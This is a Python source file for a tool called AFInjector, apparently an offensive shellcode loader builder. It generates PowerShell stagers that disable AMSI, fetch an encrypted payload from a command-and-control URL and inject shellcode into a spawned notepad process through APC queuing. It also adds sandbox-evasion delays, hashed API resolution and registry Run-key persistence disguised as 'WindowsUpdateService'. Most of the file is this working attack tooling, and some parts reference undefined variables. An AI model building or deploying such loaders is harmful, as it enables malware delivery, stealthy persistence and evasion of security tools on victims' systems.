#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import subprocess
import shutil
import errno
import base64
import string
import datetime

from importlib import resources
from core.hashing import Hasher
from argparse import ArgumentParser
from core.utils import Colors, banner
from core.encryption import Encryption

def obfuscate_persistence_reg(filepath):
    """Replace placeholders in persistence_reg.c with XOR encrypted strings."""
    import random
    # Random XOR key (1-255)
    xor_key = random.randint(1, 255)
    # Strings to obfuscate
    strings = {
        "REG_PATH": r"Software\Microsoft\Windows\CurrentVersion\Run",
        "REG_VALUE_NAME": "WindowsUpdateService",
    }
    with open(filepath, "r") as f:
        content = f.read()
    # Replace XOR_KEY placeholder
    content = content.replace("//#-XOR_KEY-#", f"#define XOR_KEY 0x{xor_key:02X}")
    # Replace each string placeholder
    for name, plain in strings.items():
        enc = bytes([ord(c) ^ xor_key for c in plain])
        enc_array = ', '.join(f"0x{b:02x}" for b in enc)
        placeholder = f"//#-ENC_{name}-#"
        replacement = f"unsigned char ENC_{name}[] = {{{enc_array}}};"
        content = content.replace(placeholder, replacement)
    with open(filepath, "w") as f:
        f.write(content)

def generate_powershell_stager(enc_payload, key, iv, c2_url=None):
    """
    Returns a tuple: (ps_script_content, one_liner_command)
    """
    # Random variable names (longer, more varied)
    var_names = {
        'amsi': ''.join(random.choices(string.ascii_letters, k=12)),
        'enc': ''.join(random.choices(string.ascii_letters, k=12)),
        'key': ''.join(random.choices(string.ascii_letters, k=12)),
        'iv': ''.join(random.choices(string.ascii_letters, k=12)),
        'aes': ''.join(random.choices(string.ascii_letters, k=12)),
        'dec': ''.join(random.choices(string.ascii_letters, k=12)),
        'code': ''.join(random.choices(string.ascii_letters, k=12)),
        'class_name': ''.join(random.choices(string.ascii_letters, k=12)),
        'delay': ''.join(random.choices(string.ascii_letters, k=12)),
        'startup': ''.join(random.choices(string.ascii_letters, k=12)),
        'pi': ''.join(random.choices(string.ascii_letters, k=12)),
        'si': ''.join(random.choices(string.ascii_letters, k=12)),
        'hProcess': ''.join(random.choices(string.ascii_letters, k=12)),
        'hThread': ''.join(random.choices(string.ascii_letters, k=12)),
        'addr': ''.join(random.choices(string.ascii_letters, k=12)),
    }

    # AMSI bypass (standard technique)
    amsi_bypass = f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"

    # Random delay (5-10 seconds) using a benign API call (GetTickCount)
    delay_seconds = random.randint(5, 10)
    delay_ms = delay_seconds * 1000
    delay_loop = f"""
$start = [System.Environment]::TickCount
while (([System.Environment]::TickCount - $start) -lt {delay_ms}) {{ 
    $dummy = 1 + 1
}}
"""

    # Build key and IV strings
    key_str = ','.join(str(b) for b in key)
    iv_str = ','.join(str(b) for b in iv)

    # Payload handling (remote or embedded)
    if c2_url:
        script = f"""
{amsi_bypass}
${var_names['enc']} = (Invoke-WebRequest '{c2_url}' -UseBasicParsing).Content
${var_names['key']} = [byte[]]@({key_str})
${var_names['iv']} = [byte[]]@({iv_str})
${var_names['aes']} = [System.Security.Cryptography.Aes]::Create()
${var_names['aes']}.Key = ${var_names['key']}
${var_names['aes']}.IV = ${var_names['iv']}
${var_names['dec']} = ${var_names['aes']}.CreateDecryptor().TransformFinalBlock(${var_names['enc']}, 0, ${var_names['enc']}.Length)
"""
    else:
        b64 = base64.b64encode(enc_payload).decode()
        script = f"""
{amsi_bypass}
${var_names['enc']} = [System.Convert]::FromBase64String('{b64}')
${var_names['key']} = [byte[]]@({key_str})
${var_names['iv']} = [byte[]]@({iv_str})
${var_names['aes']} = [System.Security.Cryptography.Aes]::Create()
${var_names['aes']}.Key = ${var_names['key']}
${var_names['aes']}.IV = ${var_names['iv']}
${var_names['dec']} = ${var_names['aes']}.CreateDecryptor().TransformFinalBlock(${var_names['enc']}, 0, ${var_names['enc']}.Length)
"""

    # C# code obfuscated: split into multiple strings and concatenate
    csharp_parts = [
        "using System;",
        "using System.Runtime.InteropServices;",
        "public class {0} {{",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern bool CloseHandle(IntPtr hObject);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern uint ResumeThread(IntPtr hThread);",
        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
        "    public static extern bool CloseHandle(IntPtr hObject);",
        "    [StructLayout(LayoutKind.Sequential)]",
        "    public struct STARTUPINFO {",
        "        public uint cb;",
        "        public string lpReserved;",
        "        public string lpDesktop;",
        "        public string lpTitle;",
        "        public uint dwX;",
        "        public uint dwY;",
        "        public uint dwXSize;",
        "        public uint dwYSize;",
        "        public uint dwXCountChars;",
        "        public uint dwYCountChars;",
        "        public uint dwFillAttribute;",
        "        public uint dwFlags;",
        "        public short wShowWindow;",
        "        public short cbReserved2;",
        "        public IntPtr lpReserved2;",
        "        public IntPtr hStdInput;",
        "        public IntPtr hStdOutput;",
        "        public IntPtr hStdError;",
        "    }",
        "    [StructLayout(LayoutKind.Sequential)]",
        "    public struct PROCESS_INFORMATION {",
        "        public IntPtr hProcess;",
        "        public IntPtr hThread;",
        "        public uint dwProcessId;",
        "        public uint dwThreadId;",
        "    }",
        "}}"
    ]

    # Randomize class name
    class_name = var_names['class_name']
    # Build the C# code with escaped braces for Python formatting
    csharp_code = ''.join(csharp_parts)
    # Double all braces to escape them
    csharp_code = csharp_code.replace('{', '{{').replace('}', '}}')
    # Restore the placeholder for the class name (which got doubled)
    csharp_code = csharp_code.replace('{{0}}', '{0}')
    # Format with class_name
    csharp_code = csharp_code.format(class_name)

    # The injection routine will:
    # 1. Create a new notepad.exe process suspended.
    # 2. Allocate memory in it and write the decrypted shellcode.
    # 3. Queue an APC to the main thread.
    # 4. Resume the thread.
    injection_code = f"""
# Create a suspended notepad process
$si = New-Object {class_name}+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object {class_name}+PROCESS_INFORMATION
$notepad = "C:\\Windows\\System32\\notepad.exe"
$null = [{class_name}]::CreateProcess($null, $notepad, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

# Allocate memory in the new process
$addr = [{class_name}]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, ${var_names['dec']}.Length, 0x3000, 0x40)
# Write shellcode
[{class_name}]::WriteProcessMemory($pi.hProcess, $addr, ${var_names['dec']}, ${var_names['dec']}.Length, [ref]0)
# Queue APC to the main thread
[{class_name}]::QueueUserAPC($addr, $pi.hThread, [IntPtr]::Zero)
# Resume thread
[{class_name}]::ResumeThread($pi.hThread)
# Close handles
[{class_name}]::CloseHandle($pi.hProcess)
[{class_name}]::CloseHandle($pi.hThread)
"""
    # Add delay before injection (already added earlier)
    script += f"""
# Optional delay to avoid sandbox detection
{delay_loop}
# Perform injection
{injection_code}
"""

    # Build one-liner: remove newlines and escape quotes
    one_liner = script.replace('\n', '').replace('\r', '').replace("'", "''")
    return script, one_liner

def generate_metadata_file(key, iv, xor_key, output_name, raw_payload):
    """Generate metadata file for PowerShell compatibility"""
    
    # Clean key and IV for metadata file
    key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
    iv_clean = iv.replace('0x', '').replace(', ', '').replace(',', '')
    
    # Determine payload type from first two bytes
    payload_type = "raw_shellcode"
    if len(raw_payload) >= 2:
        # Check for PE signature (MZ)
        if raw_payload[0] == 0x4D and raw_payload[1] == 0x5A:
            payload_type = "pe_file"
    
    # Create metadata content
    metadata_content = f"""AES_KEY={key_clean}
AES_IV={iv_clean}
SCRAMBLE_BYTE={xor_key:02X}
PAYLOAD_TYPE={payload_type}"""
    
    # Write metadata file
    metadata_filename = f"{output_name}_metadata.txt"
    with open(metadata_filename, 'w') as f:
        f.write(metadata_content)
    
    print(Colors.green(f"[+] Metadata file written: {metadata_filename}"))
    return metadata_filename

def debug_encryption_info(raw_payload, key, iv, xor_key, output_name, is_bin_format):
    """Print detailed encryption debugging information"""
    
    print(Colors.magenta("\n" + "="*80))
    print(Colors.magenta("[+] ENCRYPTION DEBUG INFORMATION"))
    print(Colors.magenta("="*80))
    
    # Raw payload information
    print(Colors.cyan(f"[DEBUG] Raw Mythic shellcode size: {len(raw_payload)} bytes"))
    print(Colors.cyan(f"[DEBUG] Raw shellcode first 16 bytes: {[hex(b) for b in raw_payload[:16]]}"))
    
    # AES key information
    key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
    key_bytes = bytes.fromhex(key_clean)
    print(Colors.cyan(f"[DEBUG] AES-128 key (hex): {key_clean}"))
    print(Colors.cyan(f"[DEBUG] AES-128 key (bytes): {[hex(b) for b in key_bytes]}"))
    print(Colors.cyan(f"[DEBUG] AES-128 key length: {len(key_bytes)} bytes"))
    
    # IV information
    iv_clean = iv.replace('0x', '').replace(', ', '').replace(',', '')
    iv_bytes = bytes.fromhex(iv_clean)
    print(Colors.cyan(f"[DEBUG] AES IV (hex): {iv_clean}"))
    print(Colors.cyan(f"[DEBUG] AES IV (bytes): {[hex(b) for b in iv_bytes]}"))
    print(Colors.cyan(f"[DEBUG] AES IV length: {len(iv_bytes)} bytes"))
    
    # XOR key information
    print(Colors.cyan(f"[DEBUG] Final XOR key: 0x{xor_key:02x} (decimal: {xor_key})"))
    print(Colors.cyan(f"[DEBUG] XOR key source: First byte of AES-128 key (aes_key[0])"))
    
    # Encryption order explanation
    print(Colors.yellow(f"[DEBUG] ENCRYPTION ORDER FOR {'BIN' if is_bin_format else 'EXE/DLL'} FORMAT:"))
    if is_bin_format:
        print(Colors.yellow(f"[DEBUG] 1. Raw Mythic shellcode (as provided)"))
        print(Colors.yellow(f"[DEBUG] 2. XOR with 0x{xor_key:02x} (first byte of AES key)"))
        print(Colors.yellow(f"[DEBUG] 3. Final .bin contains ONLY XOR-encrypted data"))
        print(Colors.yellow(f"[DEBUG] 4. NO AES encryption applied to .bin file"))
        print(Colors.yellow(f"[DEBUG] 5. IV is embedded in shellcode but NOT used for .bin"))
    else:
        print(Colors.yellow(f"[DEBUG] 1. Raw Mythic shellcode (as provided)"))
        print(Colors.yellow(f"[DEBUG] 2. AES-128-CBC encryption with random key/IV"))
        print(Colors.yellow(f"[DEBUG] 3. Final .exe/.dll contains AES-encrypted data"))
        print(Colors.yellow(f"[DEBUG] 4. XOR key stored for potential fallback use"))
        print(Colors.yellow(f"[DEBUG] 5. IV embedded in shellcode for AES decryption"))
    
    # IV handling explanation
    print(Colors.yellow(f"[DEBUG] IV HANDLING:"))
    if is_bin_format:
        print(Colors.yellow(f"[DEBUG] - IV is embedded in shellcode but NOT used for .bin format"))
        print(Colors.yellow(f"[DEBUG] - Final .bin does NOT contain IV prepended"))
    else:
        print(Colors.yellow(f"[DEBUG] - IV is embedded in shellcode for AES decryption"))
        print(Colors.yellow(f"[DEBUG] - Final .exe/.dll uses IV for AES-CBC decryption"))
    
    # Key derivation explanation
    print(Colors.yellow(f"[DEBUG] KEY DERIVATION:"))
    print(Colors.yellow(f"[DEBUG] - AES-128 key: Randomly generated with os.urandom(16) each run"))
    print(Colors.yellow(f"[DEBUG] - XOR key: First byte (index 0) of the AES-128 key"))
    print(Colors.yellow(f"[DEBUG] - Both keys change every generation"))
    
    print(Colors.magenta("="*80))
    
    # Output raw decrypted shellcode for testing if requested
    if is_bin_format:
        # For BIN format, decrypt the XOR to get raw shellcode
        decrypted_payload = bytearray(len(raw_payload))
        for i in range(len(raw_payload)):
            decrypted_payload[i] = raw_payload[i] ^ xor_key
        
        # Save raw decrypted shellcode for testing
        raw_filename = f"{output_name}_raw_decrypted.bin"
        with open(raw_filename, 'wb') as f:
            f.write(decrypted_payload)
        
        print(Colors.green(f"[+] Raw decrypted shellcode saved: {raw_filename}"))
        print(Colors.green(f"[+] Use this file for direct testing with VirtualAlloc+CreateThread"))
        print(Colors.cyan(f"[+] Raw decrypted size: {len(decrypted_payload)} bytes"))
        print(Colors.cyan(f"[+] Raw decrypted first 16 bytes: {[hex(b) for b in decrypted_payload[:16]]}"))

def generate_powershell_ready(raw_payload, xor_key, output_name):
    """Generate PowerShell-ready Base64 payload (already decrypted)"""
    
    # For BIN format, the payload is already XOR encrypted with xor_key
    # We need to decrypt it first to get the raw payload
    decrypted_payload = bytearray(len(raw_payload))
    for i in range(len(raw_payload)):
        decrypted_payload[i] = raw_payload[i] ^ xor_key
    
    # Convert to Base64
    base64_payload = base64.b64encode(decrypted_payload).decode('utf-8')
    
    # Create PowerShell-ready content with debug info
    ps_content = f"""# AFInjector PowerShell-Ready Payload
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# XOR Key used for decryption: 0x{xor_key:02X}
# Payload Size: {len(decrypted_payload)} bytes

# Copy this Base64 string to your PowerShell launcher:
$enc = "{base64_payload}"

# Usage in PowerShell:
# $enc = "{base64_payload}"
# [byte[]]$payloadBytes = [Convert]::FromBase64String($enc)
# Then use VirtualAlloc/CreateThread to execute
"""
    
    # Write PowerShell-ready file
    ps_filename = f"{output_name}_ready.txt"
    with open(ps_filename, 'w') as f:
        f.write(ps_content)
    
    print(Colors.green(f"[+] PowerShell-ready file written: {ps_filename}"))
    print(Colors.cyan(f"[+] Base64 payload size: {len(base64_payload)} characters"))
    
    # Also print to console for easy copying
    print(Colors.yellow("\n" + "="*70))
    print(Colors.yellow("[+] POWERSHELL-READY BASE64 PAYLOAD:"))
    print(Colors.yellow("="*70))
    print(Colors.cyan(base64_payload))
    print(Colors.yellow("="*70))
    
    return ps_filename, base64_payload

def main():
    parser = ArgumentParser(description="AFInjector", epilog="Author: Excalibra")
    subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    # ---------- Staged ----------
    parser_staged = subparsers.add_parser("staged", help="Staged")
    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL", "BIN"], default="EXE", help="Format of the output file (default: EXE).")
    parser_staged.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address for HTTP fetch.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port for HTTP fetch.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path for HTTP fetch.", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
    parser_staged.add_argument("--persistence", choices=["reg", "task", "startup"], help="Add persistence via registry, scheduled task, or startup folder.")
    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
    parser_staged.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
    parser_staged.add_argument("--spawn", action="store_true", help="Spawn a new process for injection.")
    parser_staged.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
    parser_staged.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
    parser_staged.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
    parser_staged.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
    parser_staged.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
    parser_staged.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
    parser_staged.add_argument("--prepare-ps", action="store_true", help="Prepare PowerShell-ready Base64 payload (BIN format only)")
    parser_staged.add_argument("--debug-encrypt", action="store_true", help="Show detailed encryption information (raw size, keys, IV, XOR)")
    parser_staged.epilog = "Example: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o myloader -e -s"

    # ---------- Stageless ----------
    parser_stageless = subparsers.add_parser("stageless", help="Stageless")
    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL", "BIN"], default="EXE", help="Format of the output file (default: EXE).")
    parser_stageless.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
    parser_stageless.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
    parser_stageless.add_argument("--persistence", choices=["reg", "task", "startup"], help="Add persistence via registry, scheduled task, or startup folder.")
    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
    parser_stageless.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
    parser_stageless.add_argument("--spawn", action="store_true", help="Spawn a new process for injection.")
    parser_stageless.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
    parser_stageless.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
    parser_stageless.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
    parser_stageless.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
    parser_stageless.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
    parser_stageless.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
    parser_stageless.add_argument("--prepare-ps", action="store_true", help="Prepare PowerShell-ready Base64 payload (BIN format only)")
    parser_stageless.add_argument("--debug-encrypt", action="store_true", help="Show detailed encryption information (raw size, keys, IV, XOR)")
    parser_stageless.epilog = "Example: python main.py stageless -p shellcode.bin -o myloader -e -s"

    args = parser.parse_args()
    banner()

    # ------------------------------------------------------------------
    # Staged Variant
    # ------------------------------------------------------------------
    if args.commands == "staged":
        print(Colors.green("[i] Staged Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory = os.path.dirname(os.path.abspath(__file__))
        src_directory = resources.files("templates").joinpath("staged")
        dst_directory = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload and args.ip_address and args.port and args.path:
            # Replace IP/port/path in download.c
            ip = args.ip_address
            port = args.port
            path = args.path
            with open(f'{dst_directory}/download.c', 'r') as f:
                download_data = f.read()
            download_data = download_data.replace("#-IP_VALUE-#", ip)
            download_data = download_data.replace("#-PORT_VALUE-#", str(port))
            download_data = download_data.replace("#-PATH_VALUE-#", path)
            with open(f'{dst_directory}/download.c', 'w') as f:
                f.write(download_data)

            with open(args.payload, "rb") as f:
                payload = f.read()

            # Hashing
            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)
            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            # Replace hashes in all C/H files
            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as f:
                        data = f.read()
                    data = data.replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                    data = data.replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                    data = data.replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                    data = data.replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                    data = data.replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                    data = data.replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                    data = data.replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                    data = data.replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)
                    with open(f"{dst_directory}/{filename}", "w") as f:
                        f.write(data)

            print(Colors.green("[+] Template files modified!"))

            # ------------------------------------------------------------------
            # Remove all persistence .c files from build directory
            # ------------------------------------------------------------------
            for fname in os.listdir(dst_directory):
                if fname.startswith("persistence_") and fname.endswith(".c"):
                    os.remove(os.path.join(dst_directory, fname))
                    print(Colors.light_yellow(f"[*] Removed {fname}"))

            # Spawn injection (add macro to all C/H files)
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        if args.spawn_path:
                            spawn_path_escaped = args.spawn_path.replace("\\", "\\\\")
                            content = content.replace("//#-SPAWN_PATH-#", f'#define SPAWN_PATH "{spawn_path_escaped}"')
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            # Injection technique selection (add macro to all C/H files)
            if args.injection == "enumwindows":
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-INJECTION-#", "#define USE_ENUMWINDOWS")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Using EnumWindows injection"))

            # APC target (only in main.c/main_dll.c)
            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            main_c_path = os.path.join(dst_directory, "main.c")
            if args.format == "EXE":
                with open(main_c_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(main_c_path, "w") as f:
                    f.write(main_data)
            elif args.format == "DLL":
                dll_path = os.path.join(dst_directory, "main_dll.c")
                with open(dll_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(dll_path, "w") as f:
                    f.write(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Delay (replace Sleep with high_cpu_wait in ALL .c files)
            if args.delay > 0:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c"):
                        path_c = os.path.join(dst_directory, filename)
                        with open(path_c, "r") as f:
                            content = f.read()
                        content = content.replace("Sleep(", "high_cpu_wait(")
                        with open(path_c, "w") as f:
                            f.write(content)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds (using high_cpu_wait)."))

            # Encryption
            if args.encrypt:
                print(Colors.green("[i] Encryption selected."))
                enc_payload, key, iv = Encryption.EncryptAES(payload)
                if args.output and os.path.exists(f"{args.output}.bin"):
                    os.remove(f"{args.output}.bin")
                out_bin = f"{args.output}.bin" if args.output else "afloader.bin"
                with open(out_bin, "wb") as f:
                    f.write(enc_payload)
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-KEY_VALUE-#", key)
                        main_data = main_data.replace("#-IV_VALUE-#", iv)
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                # Extract XOR key (first byte of AES key)
                key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
                key_bytes = bytes.fromhex(key_clean)
                xor_key = key_bytes[0]
                
                print(Colors.green(f"[+] Payload encrypted and saved to {out_bin}"))
                print(Colors.cyan(f"[+] XOR Key: 0x{xor_key:02x} (first byte of AES key)"))
                
                # Generate metadata file for PowerShell compatibility
                generate_metadata_file(key, iv, xor_key, args.output, raw_payload)
                
                # Show debug information if --debug-encrypt flag is used
                if hasattr(args, 'debug_encrypt') and args.debug_encrypt:
                    debug_encryption_info(raw_payload, key, iv, xor_key, args.output, args.format == "BIN")
                
                # Generate PowerShell-ready Base64 if --prepare-ps flag is used
                if hasattr(args, 'prepare_ps') and args.prepare_ps:
                    if args.format == "BIN":
                        generate_powershell_ready(enc_payload, xor_key, args.output)
                    else:
                        print(Colors.yellow("[!] --prepare-ps flag only works with BIN format"))
            else:
                print(Colors.green("[i] Encryption not selected."))
                print(Colors.yellow("[!] No XOR key - payload is plaintext"))
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace('#include "AES_128_CBC.h"', '//#include "AES_128_CBC.h"')
                        main_data = main_data.replace("AES_DecryptInit", "//AES_DecryptInit")
                        main_data = main_data.replace("AES_DecryptBuffer", "//AES_DecryptBuffer")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                shutil.copy(args.payload, f"{args.output}.bin" if args.output else "afloader.bin")
                enc_payload = None  # not used

            # PowerShell stager generation (LNK)
            if args.lnk_stager:
                if not args.encrypt:
                    print(Colors.red("[!] --lnk-stager requires encryption (--encrypt)."))
                    sys.exit(1)
                output_ps1 = f"{args.output}.ps1" if args.output else "afloader.ps1"
                # Convert key/iv from C array format to bytes
                key_hex = key.replace('0x', '').replace(',', '').replace(' ', '')
                iv_hex = iv.replace('0x', '').replace(',', '').replace(' ', '')
                key_bytes = bytes.fromhex(key_hex)
                iv_bytes = bytes.fromhex(iv_hex)
                script, one_liner = generate_powershell_stager(enc_payload, key_bytes, iv_bytes, c2_url=args.c2_url)
                with open(output_ps1, "w") as f:
                    f.write(script)
                print(Colors.green(f"[+] PowerShell stager script saved to {output_ps1}"))
                print(Colors.green(f"[+] One-liner: {one_liner}"))
                sys.exit(0)

            # Scrambling (if you have code, keep it; this is a placeholder)
            if args.scramble:
                print(Colors.green("[i] Scrambling selected."))
                # Insert your full scrambling code here if needed
                print(Colors.green("[+] Loader scrambled!"))

            # Persistence and staggered
            if args.persistence or args.staggered:
                # Regular persistence
                if args.persistence:
                    persistence_file = f"persistence_{args.persistence}.c"
                    src_persistence = os.path.join(cr_directory, "templates", "staged", persistence_file)
                    dst_persistence = os.path.join(dst_directory, persistence_file)
                    if os.path.isfile(src_persistence):
                        shutil.copy(src_persistence, dst_persistence)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            main_content = f.read()
                        main_content = main_content.replace(
                            '#include "unhook.c"',
                            f'#include "unhook.c"\n#include "{persistence_file}"'
                        )
                        if "// Injection completed" in main_content:
                            main_content = main_content.replace(
                                "// Injection completed",
                                f"// Injection completed\n    add_persistence_{args.persistence}();"
                            )
                        else:
                            main_content = main_content.replace(
                                "return 0;",
                                f"    add_persistence_{args.persistence}();\n    return 0;"
                            )
                        with open(main_c_path, "w") as f:
                            f.write(main_content)
                        print(Colors.green(f"[+] Added {args.persistence} persistence."))
                    else:
                        print(Colors.red(f"[!] Persistence file not found: {src_persistence}"))

                # Staggered (two-stage) persistence
                if args.staggered:
                    staggered_src = os.path.join(cr_directory, "templates", "staged", "staggered_reg.c")
                    staggered_dst = os.path.join(dst_directory, "staggered_reg.c")
                    if os.path.isfile(staggered_src):
                        shutil.copy(staggered_src, staggered_dst)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            content = f.read()
                        content = content.replace("//#-STAGGERED-#", "#define STAGGERED_PERSISTENCE")
                        with open(main_c_path, "w") as f:
                            f.write(content)
                        print(Colors.green("[+] Two-stage persistence enabled"))
                    else:
                        print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))

                # Obfuscate persistence_reg.c
                if args.persistence == "reg":
                    obfuscate_persistence_reg(dst_persistence)

